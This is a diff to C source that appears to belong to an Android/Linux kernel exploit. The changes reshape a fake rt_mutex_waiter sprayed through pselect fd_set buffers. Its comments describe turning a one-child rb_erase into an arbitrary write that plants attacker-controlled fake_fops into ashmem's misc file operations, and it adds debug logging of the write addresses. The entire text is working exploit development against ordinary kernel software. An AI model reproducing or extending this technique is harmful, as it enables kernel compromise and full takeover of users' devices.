@@ -3,7 +3,7 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PSELECT_CFI_ROUTE_ATTEMPTS 4
 #else
-#define PSELECT_CFI_ROUTE_ATTEMPTS 1
+#define PSELECT_CFI_ROUTE_ATTEMPTS 4
 #endif
 
 atomic_int cfi_stage_done;
@@ -106,17 +106,21 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   int wps = fops_pselect_words_per_set();
   int shift = SLIDE_PSELECT_WORD_SHIFT;
 
-  /* word 0 (before waiter) */
+  /* One-child rb_erase write: parent = B-8 so parent->rb_right aliases B
+   * (ashmem misc fops). tree_right=0 and tree_left=fake_fops (leaf) makes
+   * rb_erase take the survivable one-child path and store V into B.
+   * Previous overlay left tree_pc=1 / left=0, so the walk woke pselect
+   * but never planted fake_fops into ashmem_misc.fops. */
+  uintptr_t fops_write_b = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t fops_write_parent = fops_write_b - 8;
   fops_fdset_put_global(in, out, ex, wps, 0, fake_w0);
 
-  /* Compact rt_mutex_waiter layout, shifted by SLIDE_PSELECT_WORD_SHIFT */
-  fops_fdset_put_global(in, out, ex, wps, shift + 0,
-                        SLIDE_RB_PARENT_TYPE_RESTORE);
+  fops_fdset_put_global(in, out, ex, wps, shift + 0, fops_write_parent);
   fops_fdset_put_global(in, out, ex, wps, shift + 1, 0);
-  fops_fdset_put_global(in, out, ex, wps, shift + 2, 0);
-  fops_fdset_put_global(in, out, ex, wps, shift + 3, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 2, fake_fops);
+  fops_fdset_put_global(in, out, ex, wps, shift + 3, fops_write_parent);
   fops_fdset_put_global(in, out, ex, wps, shift + 4, 0);
-  fops_fdset_put_global(in, out, ex, wps, shift + 5, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 5, fake_fops);
   fops_fdset_put_global(in, out, ex, wps, shift + 6,
                         (uint64_t)text_addr(INIT_TASK));
   fops_fdset_put_global(in, out, ex, wps, shift + 7, fake_lock);
@@ -125,6 +129,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                         (uint32_t)SLIDE_WAITER_WAKE_STATE);
   fops_fdset_put_global(in, out, ex, wps, shift + 9, 0);
   fops_fdset_put_global(in, out, ex, wps, shift + 10, 0);
+  pr_info("pselect fops erase parent=%016zx value=%016zx dest=%016zx lock=%016zx\n",
+          fops_write_parent, fake_fops, fops_write_b, fake_lock);
 }
 
 void do_pselect_fake_lock_route(void) {
